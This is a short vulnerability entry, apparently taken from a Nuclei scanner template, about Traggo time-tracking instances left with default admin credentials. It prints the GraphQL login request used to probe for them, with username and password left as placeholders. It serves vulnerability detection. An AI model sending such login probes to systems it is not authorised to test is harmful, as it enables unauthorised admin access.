# Vulnerability: Traggo - Default Login
**Classification:** TRAGGO
**Source:** Nuclei Template (`traggo-default-login.yaml`)

## Description
Detected Traggo time tracking application was found using default admin credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /graphql HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"operationName":"Login","variables":{"name":"{{username}}","pass":"{{password}}","deviceType":"ShortExpiry"},"query":"mutation Login($name: String!, $pass: String!, $deviceType: DeviceType!) {\n  login(username: $name, pass: $pass, deviceName: \"web ui\", type: $deviceType, cookie: true) {\n    user {\n      id\n      name\n      admin\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

